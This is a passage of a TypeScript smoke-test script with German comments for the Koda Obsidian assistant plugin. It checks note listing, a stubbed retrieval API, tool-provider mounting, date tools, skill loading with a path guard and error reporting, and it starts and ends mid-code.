        const t = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].buildTools();
        return {
          vorher: false,
          flat: await t.run("list_notes", { folder: W }),
          root: await t.run("list_notes", { folder: "" }),
          fehlt: await t.run("list_notes", { folder: W + "/Gibtsnicht" }),
        };
      `);
      eigen42 = !r42.vorher;
      if (r42.vorher) {
        detail42 = `${W42} existiert schon (Rest eines abgebrochenen Laufs?) — nicht gemessen, bitte von Hand entfernen`;
      } else {
        const flat = r42.flat?.content ?? r42.flat?.error ?? "";
        const root = r42.root?.content ?? r42.root?.error ?? "";
        const ohne = flat.includes(`${W42}/Ohne (keine Notiz)`);
        const voll = flat.includes(`${W42}/Voll (1 Notiz)`);
        const kopf = /2 Unterordner/.test(flat.split("\n")[0] ?? "");
        // Die Wurzel-Liste muss Unterordner nennen (das Fixture hat welche), und keiner davon
        // darf die Wurzel selbst sein — Obsidian fuehrt sie als "/", ein Filterfehler zeigte
        // sie als "/ (…)" oder als leeren Namen " (…)".
        const wurzelZeile = root.split("\n")[1] ?? "";
        const wurzelSauber = wurzelZeile.startsWith("Unterordner: ")
          && wurzelZeile.slice("Unterordner: ".length).split(" · ").every((e) => !e.startsWith("/") && !e.startsWith("("));
        const fehlt = r42.fehlt?.ok === false && /gibt es nicht/.test(r42.fehlt.error ?? "");
        ok42 = r42.flat?.ok === true && ohne && voll && kopf && wurzelSauber && fehlt;
        const zweite = flat.split("\n")[1] ?? "";
        detail42 = `Kopf ${kopf ? "nennt 2 Unterordner" : "OHNE Unterordnerzahl"} · „${zweite.slice(0, 90)}“ · `
          + `Ohne ${ohne ? "gesehen" : "FEHLT"} · Voll ${voll ? "gesehen" : "FEHLT"} · Wurzel ${wurzelSauber ? "sauber" : "MIT „/“"} · `
          + `fehlender Ordner ${fehlt ? "als nicht existent gemeldet" : `NICHT: ${(r42.fehlt?.error ?? r42.fehlt?.content ?? "").slice(0, 60)}`}`;
      }
    } catch (error) {
      detail42 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      if (eigen42) await cdp.evaluate(`
        const f = app.vault.getAbstractFileByPath(${JSON.stringify(W42)});
        if (f) await app.vault.delete(f, true);
        return true;
      `).catch(() => undefined);
    }
    record("42. list_notes nennt Unterordner, auch einen ohne Notiz; fehlender Ordner als nicht existent", ok42, detail42);

    // ── 43–46: Etappe 3a — vault-rag als Quelle (Stub, Muster Punkt 41) ─────────────────
    // Der Stub erfuellt `readRetrievalApi` (apiVersion 1, status/search/related als Funktionen)
    // und protokolliert jede Anfrage in window.__kodaRagSeen. `window.__kodaRagFail` schaltet
    // search() auf { ok:false, reason:"offline" } — die Gegenprobe fuer den Hinweis im Block.
    const ragVorher = await cdp.evaluate<boolean>(`return !!app.plugins.plugins["vault-retrieval"];`);
    const installRagStub = (): Promise<unknown> => cdp.evaluate(`
      window.__kodaRagSeen = [];
      window.__kodaRagFail = false;
      app.plugins.plugins["vault-retrieval"] = {
        __kodaSmokeStub: true,
        api: {
          apiVersion: 1,
          status: () => ({ apiVersion: 1, indexed: true, noteCount: 4, reindexing: false }),
          search: async (q, o) => {
            window.__kodaRagSeen.push({ op: "search", q, k: o && o.k });
            return window.__kodaRagFail
              ? { ok: false, reason: "offline" }
              : { ok: true, hits: [{ path: "Notes/Compaction.md", score: 0.9 }] };
          },
          related: async (p, o) => {
            window.__kodaRagSeen.push({ op: "related", p, k: o && o.k });
            return { ok: true, hits: [{ path: "Koda/Memory.md", score: 0.8 }] };
          },
        },
      };
      return true;
    `);
    const removeRagStub = (): Promise<unknown> => cdp.evaluate(`
      if (app.plugins.plugins["vault-retrieval"]?.__kodaSmokeStub) delete app.plugins.plugins["vault-retrieval"];
      delete window.__kodaRagSeen; delete window.__kodaRagFail;
      return true;
    `).catch(() => undefined);

    if (ragVorher) {
      const grund = "uebersprungen — ein vault-retrieval-Eintrag existiert bereits (echtes Plugin oder Rest eines abgebrochenen Laufs); Stub wuerde ihn ueberschreiben";
      record("43. Modus Vault: Treffer zur gesendeten Frage im Volltext, Fehlschlag meldet sich", true, grund);
      record("44. Modus Vault ist ohne vault-rag gesperrt (Dropdown und Befehl)", true, grund);
      record("45. Modus Notiz: semantische Nachbarn aus related(), K = 0 schaltet ab", true, grund);
      record("46. Kontext-Tab: Vault-Vorschau folgt dem Entwurf im Eingabefeld (entprellt)", true, grund);
    } else {
      // ── 43 ──
      let ok43 = false; let detail43 = "";
      try {
        await installRagStub();
        const r = await cdp.evaluate<{ mode: string; items: string[]; seen: { op: string; q: string; k: number }[]; k: number; failText: string; failItems: string[] }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.setContextMode("vault");
          const frage = "Wie funktioniert die Verdichtung?";
          const ctx = await p.currentContext(frage);
          window.__kodaRagFail = true;
          const fail = await p.currentContext(frage);
          return {
            mode: ctx?.mode ?? "",
            items: (ctx?.items ?? []).map((i) => i.source + ":" + i.path + ":" + i.kind),
            seen: window.__kodaRagSeen,
            k: p.settings.contextAutoK,
            failText: fail?.text ?? "",
            failItems: (fail?.items ?? []).map((i) => i.source + ":" + i.path),
          };
        `);
        const suche = r.seen.find((s) => s.op === "search");
        ok43 = r.mode === "vault"
          && r.items.includes("vault:Notes/Compaction.md:full")
          && suche?.q === "Wie funktioniert die Verdichtung?" && suche.k === r.k
          && /Vault-Suche nicht verfügbar|Vault search unavailable/.test(r.failText)
          && !r.failItems.some((i) => i.startsWith("vault:"));
        detail43 = `Modus ${r.mode} · Eintraege ${r.items.join(", ")} · Suche „${suche?.q ?? "—"}" k=${String(suche?.k)} · Gegenprobe offline: ${/nicht verfügbar|unavailable/.test(r.failText) ? "Hinweis im Block" : "KEIN Hinweis"}`;
      } catch (error) {
        detail43 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      }
      record("43. Modus Vault: Treffer zur gesendeten Frage im Volltext, Fehlschlag meldet sich", ok43, detail43);

      // ── 44 ── (Stub steht noch: erst MIT, dann OHNE vault-rag messen)
      let ok44 = false; let detail44 = "";
      try {
        const mit = await cdp.evaluate<boolean>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          for (const v of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) v.view.syncContextMode();
          const opt = document.querySelector('.koda-input-bar select.koda-mode option[value="vault"]');
          return opt !== null && opt.disabled === false;
        `);
        await removeRagStub();
        const ohne = await cdp.evaluate<{ disabled: boolean; label: string; modeNachBefehl: string }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.setContextMode("workspace");
          p.setContextMode("vault");
          const opt = document.querySelector('.koda-input-bar select.koda-mode option[value="vault"]');
          return { disabled: opt?.disabled === true, label: opt?.textContent ?? "", modeNachBefehl: p.contextMode };
        `);
        ok44 = mit && ohne.disabled && ohne.modeNachBefehl === "workspace" && /vault-rag/.test(ohne.label);
        detail44 = `mit Stub waehlbar: ${String(mit)} · ohne: gesperrt ${String(ohne.disabled)} („${ohne.label}"), Befehl laesst Modus auf „${ohne.modeNachBefehl}"`;
      } catch (error) {
        detail44 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      }
      record("44. Modus Vault ist ohne vault-rag gesperrt (Dropdown und Befehl)", ok44, detail44);

      // ── 45 ──
      let ok45 = false; let detail45 = "";
      try {
        await installRagStub();
        const r = await cdp.evaluate<{ mit: string[]; ohne: string[]; seenRelated: boolean }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const file = app.vault.getFileByPath("Notes/Project plan.md");
          await app.workspace.getLeaf(false).openFile(file);
          p.setContextMode("note");
          const kVorher = p.settings.contextAutoK;
          const mit = await p.currentContext();
          p.settings.contextAutoK = 0;
          const ohne = await p.currentContext();
          p.settings.contextAutoK = kVorher;
          return {
            mit: (mit?.items ?? []).map((i) => i.source + ":" + i.path),
            ohne: (ohne?.items ?? []).map((i) => i.source + ":" + i.path),
            seenRelated: window.__kodaRagSeen.some((s) => s.op === "related" && s.p === "Notes/Project plan.md"),
          };
        `);
        ok45 = r.seenRelated && r.mit.includes("related:Koda/Memory.md") && !r.ohne.some((i) => i.startsWith("related:"));
        detail45 = `related() fuer die aktive Notiz: ${String(r.seenRelated)} · mit K: ${r.mit.join(", ")} · K=0: ${r.ohne.join(", ")}`;
      } catch (error) {
        detail45 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      }
      record("45. Modus Notiz: semantische Nachbarn aus related(), K = 0 schaltet ab", ok45, detail45);

      // ── 46 ──
      let ok46 = false; let detail46 = "";
      try {
        await cdp.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.setContextMode("vault");
          window.__kodaRagSeen = [];
          const view = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0].view;
          view.setTab("context");
          const input = view.containerEl.querySelector("textarea.koda-input");
          input.value = "Welche Werkzeuge hat Koda?";
          input.dispatchEvent(new Event("input"));
          return true;
        `);
        const r = await pollUntil<{ chips: string[]; queries: string[] }>(cdp, `
          const view = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0].view;
          const chips = [...view.containerEl.querySelectorAll(".koda-ctx-chip")].map((c) => c.getAttribute("title"));
          const queries = (window.__kodaRagSeen || []).filter((s) => s.op === "search").map((s) => s.q);
          return chips.includes("Notes/Compaction.md") ? { chips, queries } : null;
        `, 5_000);
        // Der Chat muss im Kontext-Tab WEG sein (display none) — sonst steht das Kontext-Panel
        // zwar im DOM, aber 800 px unterhalb des Sichtbaren (Spezifitaets-Fehler in styles.css,
        // gemessen 2026-09-25; DOM-Existenz der Chips allein hatte ihn nie gefangen).
        const chatWeg = await cdp.evaluate<boolean>(`
          const view = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0].view;
          const chat = view.containerEl.querySelector('.okit-hub-panel[data-tab="chat"]');
          const kontext = view.containerEl.querySelector(".koda-ctx-body");
          return chat !== null && getComputedStyle(chat).display === "none" && kontext !== null && kontext.getBoundingClientRect().top < window.innerHeight;
        `);
        ok46 = r !== null && r.queries.includes("Welche Werkzeuge hat Koda?") && chatWeg;
        detail46 = r === null
          ? "kein Vault-Chip binnen 5 s nach dem Tippen"
          : `Chips ${r.chips.join(", ")} · Suchen ${r.queries.map((q) => `„${q}"`).join(", ")} · Chat im Kontext-Tab ausgeblendet und Panel im Bild: ${String(chatWeg)}`;
      } catch (error) {
        detail46 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      } finally {
        await cdp.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const view = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0].view;
          const input = view.containerEl.querySelector("textarea.koda-input");
          if (input) input.value = "";
          p.setContextQuery("");
          p.setContextMode("workspace");
          view.setTab("chat");
          return true;
        `).catch(() => undefined);
        await removeRagStub();
      }
      record("46. Kontext-Tab: Vault-Vorschau folgt dem Entwurf im Eingabefeld (entprellt)", ok46, detail46);
    }

    // --- 47. Werkzeug-Anbieter: ein fremdes Plugin wird montiert, geroutet, abgeschaltet, entfernt ---
    // Spike 2026-09-25 (Cockpit-Task „Werkzeug-Anbieter-Vertrag"). Die pure Schicht ist
    // unit-getestet; hier zaehlt die NAHT: liest `currentToolNames()` wirklich aus
    // `app.plugins.plugins[*].api`, geht `buildTools().run()` an `executeTool()` des Anbieters,
    // greift der Nutzer-Schalter aus `toolsDisabled` auch fuer ein montiertes Werkzeug, und
    // verschwindet das Werkzeug samt Route, sobald der Anbieter weg ist? Ein Stub unter einer
    // eigenen Plugin-Id — kein echtes Plugin traegt sie, also kann der Punkt nichts
    // ueberschreiben (CORE-TEST-21). Stub-Form = Vertragsstand vault-rag 92c6c4d.
    const PROV = "koda-smoke-provider";
    let detail47 = "nicht gelaufen";
    let ok47 = false;
    const provVorher = await cdp.evaluate<boolean>(`return !!app.plugins.plugins[${JSON.stringify(PROV)}];`);
    if (provVorher) {
      detail47 = `uebersprungen — ${PROV} existiert bereits (Rest eines abgebrochenen Laufs)`;
      record("47. Werkzeug-Anbieter: montiert, geroutet, abschaltbar, entfernt", true, detail47);
    } else {
      try {
        const vorher = await cdp.evaluate<string[]>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].currentToolNames();`);
        await cdp.evaluate(`
          window.__kodaProvCalls = [];
          app.plugins.plugins[${JSON.stringify(PROV)}] = {
            api: {
              version: 1,
              tools: (opts) => [
                { name: "smoke_echo", description: "Smoke: " + String(opts && opts.lang), parameters: { type: "object", properties: { text: { type: "string", description: "x" } }, required: ["text"] }, writes: false },
                { name: "read_note", description: "Kollision mit dem Wirt — darf NICHT montiert werden", parameters: { type: "object", properties: {}, required: [] }, writes: false },
                { name: "related_notes", description: "Anbieter-Fassung", parameters: { type: "object", properties: { path: { type: "string", description: "p" } }, required: ["path"] }, writes: false },
              ],
              executeTool: async (name, args, opts) => {
                window.__kodaProvCalls.push({ name, args, lang: opts && opts.lang, hatConfirm: typeof (opts && opts.confirm) === "function" });
                return { ok: true, content: name === "related_notes" ? "related:" + String(args.path) : "echo:" + String(args.text) };
              },
            },
          };
          return true;
        `);
        const p = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
        const mit = await cdp.evaluate<string[]>(`return ${p}.currentToolNames();`);
        const defs = await cdp.evaluate<{ name: string; description: string }[]>(`return ${p}.currentToolDefs().filter(d => d.name === "smoke_echo" || d.name === "read_note");`);
        const lauf = await cdp.evaluate<{ ok: boolean; content?: string; error?: string }>(`return await ${p}.buildTools().run("smoke_echo", { text: "hallo" });`);
        // Wirts-Name aus dem Anbieter: `related_notes` muss an den Anbieter gehen, nicht in
        // Kodas eigenen Pfad (Praxistest-Befund 2026-09-25: die erste Fassung routete nach Name).
        const related = await cdp.evaluate<{ ok: boolean; content?: string; error?: string }>(`return await ${p}.buildTools().run("related_notes", { path: "Notes/Tools.md" });`);
        const calls = await cdp.evaluate<{ name: string; args: unknown; lang: string; hatConfirm: boolean }[]>(`return window.__kodaProvCalls;`);
        // Nutzer-Schalter: abgeschaltet heisst nicht gesendet UND nicht ausfuehrbar.
        const aus = await cdp.evaluate<{ names: string[]; lauf: { ok: boolean; error?: string } }>(`
          const p = ${p};
          const alt = p.settings.toolsDisabled;
          p.settings.toolsDisabled = [...alt, "smoke_echo"];
          const names = p.currentToolNames();
          const lauf = await p.buildTools().run("smoke_echo", { text: "x" });
          p.settings.toolsDisabled = alt;
          return { names, lauf };
        `);
        // Anbieter weg: Werkzeug weg, Aufruf meldet Klartext statt zu werfen.
        const weg = await cdp.evaluate<{ names: string[]; lauf: { ok: boolean; error?: string } }>(`
          delete app.plugins.plugins[${JSON.stringify(PROV)}];
          const p = ${p};
          return { names: p.currentToolNames(), lauf: await p.buildTools().run("smoke_echo", { text: "x" }) };
        `);
        const readNoteDef = defs.find((d) => d.name === "read_note");
        ok47 = !vorher.includes("smoke_echo")
          && mit.includes("smoke_echo")
          && mit.filter((n) => n === "read_note").length === 1
          && readNoteDef !== undefined && !readNoteDef.description.startsWith("Kollision")
          && lauf.ok === true && lauf.content === "echo:hallo"
          && related.ok === true && related.content === "related:Notes/Tools.md"
          && calls.length === 2 && calls[0].name === "smoke_echo" && (calls[0].lang === "de" || calls[0].lang === "en") && calls[0].hatConfirm
          && calls[1].name === "related_notes"
          && !aus.names.includes("smoke_echo") && aus.lauf.ok === false && /abgeschaltet/.test(aus.lauf.error ?? "")
          && !weg.names.includes("smoke_echo") && weg.lauf.ok === false && /nicht mehr verf/.test(weg.lauf.error ?? "");
        detail47 = `vorher ${vorher.length} Werkzeuge · mit Anbieter ${mit.length} (smoke_echo ${mit.includes("smoke_echo") ? "montiert" : "FEHLT"}, read_note ${mit.filter((n) => n === "read_note").length}× — ${readNoteDef?.description.startsWith("Kollision") ? "ANBIETER GEWANN" : "Wirt gewann"}) · `
          + `run → ${lauf.ok ? `„${lauf.content}“` : `Fehler „${lauf.error}“`} · related_notes → ${related.ok ? `„${related.content}“` : `Fehler „${related.error}“`} · executeTool sah lang=${calls[0]?.lang}, confirm=${calls[0]?.hatConfirm} · `
          + `abgeschaltet: gesendet ${aus.names.includes("smoke_echo")}, run „${aus.lauf.error ?? "ok?!"}“ · `
          + `entfernt: gesendet ${weg.names.includes("smoke_echo")}, run „${weg.lauf.error ?? "ok?!"}“`;
      } catch (error) {
        detail47 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      } finally {
        await cdp.evaluate(`
          delete app.plugins.plugins[${JSON.stringify(PROV)}];
          delete window.__kodaProvCalls;
          return true;
        `).catch(() => undefined);
      }
      record("47. Werkzeug-Anbieter: montiert, geroutet, abschaltbar, entfernt", ok47, detail47);
    }

    // --- 48. list_notes mit depth zeigt den Ordnerbaum — auch einen leeren Ordner auf Ebene 2 ---
    // Anlass 2026-09-26: Koda fragte nach einer Landkarte des Vaults. Die pure Schicht ist
    // unit-getestet (Kappung nach Ebenen, Reihenfolge, Warnung); offen ist hier die NAHT:
    // liefert `vault.getAllFolders()` einen Ordner ohne Notiz auch in der ZWEITEN Ebene, und
    // kommt `depth` als String aus dem Modell ueber `run()` im Baum an? Gebaut wird zwei Projekte
    // — eines mit `_Tasks` UND leerem `_Meilensteine`, eines nur mit `_Tasks` —, also genau die
    // Frage „fehlt irgendwo ein Struktur-Ordner?". Eigenen Zustand vorher pruefen (CORE-TEST-21).
    const W48 = "Koda/smoke48";
    let detail48 = "nicht gelaufen";
    let ok48 = false;
    let eigen48 = true;
    try {
      const r48 = await cdp.evaluate<{
        vorher: boolean;
        tief?: { ok: boolean; content?: string; error?: string };
        flach?: { ok: boolean; content?: string; error?: string };
      }>(`
        const W = ${JSON.stringify(W48)};
        if (app.vault.getAbstractFileByPath(W) !== null) return { vorher: true };
        await app.vault.createFolder(W + "/A/_Tasks");
        await app.vault.createFolder(W + "/A/_Meilensteine");
        await app.vault.createFolder(W + "/B/_Tasks");
        await app.vault.create(W + "/A/_Tasks/t.md", "x");
        await app.vault.create(W + "/B/_Tasks/u.md", "x");
        const t = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].buildTools();
        return {
          vorher: false,
          tief: await t.run("list_notes", { folder: W, depth: "2" }),
          flach: await t.run("list_notes", { folder: W }),
        };
      `);
      eigen48 = !r48.vorher;
      if (r48.vorher) {
        detail48 = `${W48} existiert schon (Rest eines abgebrochenen Laufs?) — nicht gemessen, bitte von Hand entfernen`;
      } else {
        const tief = r48.tief?.content ?? r48.tief?.error ?? "";
        const flach = r48.flach?.content ?? r48.flach?.error ?? "";
        const kopf = /Ordnerbaum bis Tiefe 2 \(5 Ordner/.test(tief);
        const leer = tief.includes(`  ${W48}/A/_Meilensteine/ (keine Notiz)`);
        const tasksB = tief.includes(`  ${W48}/B/_Tasks/ (1 Notiz)`);
        // Die flache Liste bleibt, wie sie war — depth darf das Verhalten ohne Parameter nicht aendern.
        const flachWieVorher = flach.includes("Unterordner: ") && !flach.includes("Ordnerbaum");
        ok48 = r48.tief?.ok === true && kopf && leer && tasksB && flachWieVorher;
        detail48 = `Kopf ${kopf ? "„Tiefe 2, 5 Ordner“" : `FALSCH: ${tief.split("\n").slice(0, 2).join(" ⏎ ").slice(0, 90)}`} · `
          + `leeres _Meilensteine ${leer ? "gesehen" : "FEHLT"} · B/_Tasks ${tasksB ? "gesehen" : "FEHLT"} · `
          + `ohne depth ${flachWieVorher ? "unverändert flach" : "VERÄNDERT"}`;
      }
    } catch (error) {
      detail48 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      if (eigen48) await cdp.evaluate(`
        const f = app.vault.getAbstractFileByPath(${JSON.stringify(W48)});
        if (f) await app.vault.delete(f, true);
        return true;
      `).catch(() => undefined);
    }
    record("48. list_notes mit depth zeigt den Ordnerbaum, leere Ordner der zweiten Ebene inklusive", ok48, detail48);

    // --- 50. Kit-Chat-Client (Welle 11): HTTP 200 mit JSON-Fehlerkoerper wird als Fehler
    // gemeldet, mit der Servermeldung ----------------------------------------------------
    // Der alte Client las den Koerper als SSE, fand keine `data:`-Zeile und lieferte eine
    // LEERE Erfolgsantwort — der Nutzer sah eine leere Blase ohne Grund. Der Kit-Client
    // (`createChatClient`) prueft den Koerper und meldet `http` mit der Servermeldung. Wie
    // Punkt 40 ein echter p.ask()-Roundtrip aus dem Renderer (XHR-Transport) gegen einen
    // eigenen Server — die Obsidian-Kante (main.ts setzt lastNotice, view.ts rendert) ist
    // durch Unit-Tests nicht zu sehen.
    const errStub = { content: "", finishReason: "stop", errorBody: JSON.stringify({ error: { message: "model not loaded" } }) };
    const fake50 = await startFakeEndpoint(0, errStub);
    let detail50 = "";
    let ok50 = false;
    try {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.endpoints = [{ url: ${JSON.stringify(fake50.url)} }];
        await p.saveSettings();
        await p.newChat();
        void p.ask("Smoke-Test: bitte antworten.");
        return true;
      `);
      const getroffen50 = await pollUntil<{ noticeText: string; noticeKlasse: string; busy: boolean }>(
        cdp,
        `
          const p2 = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          if (p2.busy) return null;
          const el = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0]?.view?.containerEl;
          // Ein Anfragefehler steht als ".koda-msg.koda-error" im Verlauf (view.ts), nicht als Notiz.
          const notice = el?.querySelector(".koda-msg.koda-error");
          if (!notice) return null;
          return { noticeText: notice.textContent.trim(), noticeKlasse: notice.className, busy: p2.busy };
        `,
        15_000,
      );
      ok50 =
        getroffen50 !== null
        && getroffen50.busy === false
        && getroffen50.noticeKlasse.includes("koda-error")
        && getroffen50.noticeText.includes("model not loaded");
      detail50 = getroffen50
        ? `Notiz „${getroffen50.noticeText.slice(0, 120)}“ (${getroffen50.noticeKlasse})`
        : "kein Fehlerhinweis innerhalb 15s (leere Antwort ohne Grund?)";
    } catch (error) {
      detail50 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      await fake50.close();
    }
    record("50. HTTP 200 mit JSON-Fehlerkörper meldet die Servermeldung statt einer leeren Antwort (Kit-Chat-Client)", ok50, detail50);

    // --- 51. Datum und Uhrzeit (Welle 14): `## Now` im Prompt, `get_datetime` als Werkzeug ---
    // Die pure Schicht ist unit-getestet (Format, Zeitzone, Hash-Stabilitaet). Offen ist die NAHT:
    // kommt der Anhang ueber `previewSystemPrompt()` im echten Host an — Zeitzone aus dem Renderer,
    // `realClock` aus dem vendorten Kit —, steht das Werkzeug in der gesendeten Liste, und nennen
    // beide dasselbe Datum wie die Uhr des Renderers? Die Gegenprobe ist der Kalendertag selbst:
    // `new Date()` im Renderer, lokal formatiert, nicht ein zweites Mal durch renderNow gerechnet.
    let detail49 = "nicht gelaufen";
    let ok49 = false;
    try {
      const r49 = await cdp.evaluate<{
        inListe: boolean;
        lauf: { ok: boolean; content?: string; error?: string };
        prompt: string;
        heute: string;
      }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const d = new Date();
        const pad = (n) => String(n).padStart(2, "0");
        return {
          inListe: p.currentToolNames().includes("get_datetime"),
          lauf: await p.buildTools().run("get_datetime", {}),
          prompt: await p.previewSystemPrompt(),
          heute: d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()),
        };
      `);
      const FORM = /^(\d{4}-\d{2}-\d{2}) \((Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday)\) \d{2}:\d{2}, \S+$/;
      const zeile = r49.lauf.content ?? "";
      const nowAnhang = r49.prompt.split("\n## Now\n")[1]?.split("\n")[0] ?? "";
      const datumLauf = FORM.exec(zeile)?.[1];
      const datumPrompt = FORM.exec(nowAnhang)?.[1];
      ok49 = r49.inListe && r49.lauf.ok === true && datumLauf === r49.heute && datumPrompt === r49.heute
        && r49.prompt.trimEnd().endsWith(nowAnhang);
      detail49 = `Werkzeug in der Liste: ${r49.inListe} · get_datetime → ${r49.lauf.ok ? `„${zeile}“` : `Fehler „${r49.lauf.error}“`} · `
        + `## Now im Prompt: ${nowAnhang !== "" ? `„${nowAnhang}“` : "FEHLT"}${r49.prompt.trimEnd().endsWith(nowAnhang) ? " (letzter Abschnitt)" : " (NICHT am Ende)"} · `
        + `Kalendertag der Renderer-Uhr ${r49.heute}${datumLauf === r49.heute && datumPrompt === r49.heute ? " stimmt" : " WEICHT AB"}`;
    } catch (error) {
      detail49 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    }
    record("51. Datum und Uhrzeit: ## Now im Prompt und get_datetime nennen den Kalendertag der Renderer-Uhr", ok49, detail49);

    // --- 52. Zweistufiges Skill-Laden (Welle 14): pinned voll, der Rest auf Abruf via load_skill ---
    // Zwei echte Dateien unter `<Koda>/Skills/`: eine gepinnt, eine nicht. Gemessen wird ueber den
    // echten Weg — `readSkills()` liest den Vault, `previewSystemPrompt()` baut den Prompt,
    // `run("load_skill")` liest die Datei. Der Pfad-Guard wird an der Naht geprueft: ein Name mit
    // Pfad darf keine Notiz ausserhalb von `Skills/` liefern. Eigenen Zustand vorher pruefen.
    const S51 = ["Koda/Skills/smoke51-pin.md", "Koda/Skills/smoke51-lazy.md", "Koda/smoke51-ausserhalb.md"];
    let detail51 = "nicht gelaufen";
    let ok51 = false;
    let eigen51 = true;
    try {
      const r51 = await cdp.evaluate<{
        vorher: boolean;
        prompt?: string;
        status?: string | null;
        lazy?: { ok: boolean; content?: string; error?: string };
        pin?: { ok: boolean; content?: string; error?: string };
        pfad?: { ok: boolean; content?: string; error?: string };
        fremd?: { ok: boolean; content?: string; error?: string };
        unbekannt?: { ok: boolean; content?: string; error?: string };
      }>(`
        const P = ${JSON.stringify(S51)};
        for (const f of P) if (app.vault.getAbstractFileByPath(f) !== null) return { vorher: true };
        await app.vault.create(P[0], "---\\ndescription: smoke pin\\npinned: true\\n---\\nPIN-BODY-51");
        await app.vault.create(P[1], "---\\ndescription: smoke lazy\\n---\\nLAZY-BODY-51");
        await app.vault.create(P[2], "---\\ndescription: d\\n---\\nAUSSERHALB-51");
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const t = p.buildTools();
        const { selection, failed } = await p.readSkills();
        return {
          vorher: false,
          prompt: await p.previewSystemPrompt(),
          status: p.skillStatusText(selection, failed),
          lazy: await t.run("load_skill", { name: "smoke51-lazy" }),
          pin: await t.run("load_skill", { name: "smoke51-pin.md" }),
          pfad: await t.run("load_skill", { name: "../smoke51-ausserhalb" }),
          fremd: await t.run("load_skill", { name: "Koda/smoke51-ausserhalb" }),
          unbekannt: await t.run("load_skill", { name: "gibt-es-nicht" }),
        };
      `);
      eigen51 = !r51.vorher;
      if (r51.vorher) {
        detail51 = "smoke51-Dateien existieren schon (Rest eines abgebrochenen Laufs?) — nicht gemessen, bitte von Hand entfernen";
      } else {
        const pr = r51.prompt ?? "";
        const pinVoll = pr.includes("PIN-BODY-51");
        const lazyNurKopf = pr.includes("smoke lazy") && !pr.includes("LAZY-BODY-51") && pr.includes("call load_skill");
        const geholt = r51.lazy?.ok === true && (r51.lazy.content ?? "").includes("LAZY-BODY-51");
        const idem = r51.pin?.ok === true && (r51.pin.content ?? "").includes("PIN-BODY-51");
        const guard = r51.pfad?.ok === false && r51.fremd?.ok === false
          && !(r51.pfad?.error ?? "").includes("AUSSERHALB") && !(r51.fremd?.error ?? "").includes("AUSSERHALB");
        const liste = r51.unbekannt?.ok === false && /smoke51-lazy/.test(r51.unbekannt.error ?? "") && /smoke51-pin/.test(r51.unbekannt.error ?? "");
        const meldung = /on demand|auf Abruf/.test(r51.status ?? "");
        ok51 = pinVoll && lazyNurKopf && geholt && idem && guard && liste && meldung;
        detail51 = `gepinnt: Body im Prompt ${pinVoll} · ungepinnt: nur Beschreibung + Hinweis ${lazyNurKopf} · load_skill holt den Body ${geholt} · gepinnter Skill idempotent ${idem} · `
          + `Pfad-Guard (../ und Ordner/Name) ${guard ? "lehnt ab" : "LIEFERT FREMDE NOTIZ"} · unbekannter Name nennt die Liste ${liste} · Ladezustand „${(r51.status ?? "").split("\n").find((z) => /on demand|auf Abruf/.test(z)) ?? "FEHLT"}“`;
      }
    } catch (error) {
      detail51 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      if (eigen51) await cdp.evaluate(`
        for (const f of ${JSON.stringify(S51)}) { const x = app.vault.getAbstractFileByPath(f); if (x) await app.vault.delete(x, true); }
        return true;
      `).catch(() => undefined);
    }
    record("52. Skills laden zweistufig: pinned voll, der Rest nur als Beschreibung, load_skill holt den Body und hält den Pfad-Guard", ok51, detail51);

    // --- 53. Byte-Token-Guard (Welle 14): literale <0x..>-Folgen werden VOR dem Schreiben dekodiert ---
    // Belege aus dem Vault Arbeit (koda-start.md, koda-dashboard.md). Gemessen wird der echte
    // Schreibweg ueber `run("write_note")` in den Koda-Ordner (frei, ohne Dialog): was in der Datei
    // landet, nicht was das Werkzeug meldet. Die unvollstaendige Folge darf KEINE Datei erzeugen.
    const W52 = "Koda/smoke52.md";
    const W52b = "Koda/smoke52-kaputt.md";
    let detail52 = "nicht gelaufen";
    let ok52 = false;
    let eigen52 = true;
    try {
      const r52 = await cdp.evaluate<{
        vorher: boolean;
        gut?: { ok: boolean; error?: string };
        text?: string | null;
        kaputt?: { ok: boolean; error?: string };
        kaputtDa?: boolean;
        ascii?: string | null;
      }>(`
        const a = ${JSON.stringify(W52)}, b = ${JSON.stringify(W52b)};
        if (app.vault.getAbstractFileByPath(a) !== null || app.vault.getAbstractFileByPath(b) !== null) return { vorher: true };
        const t = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].buildTools();
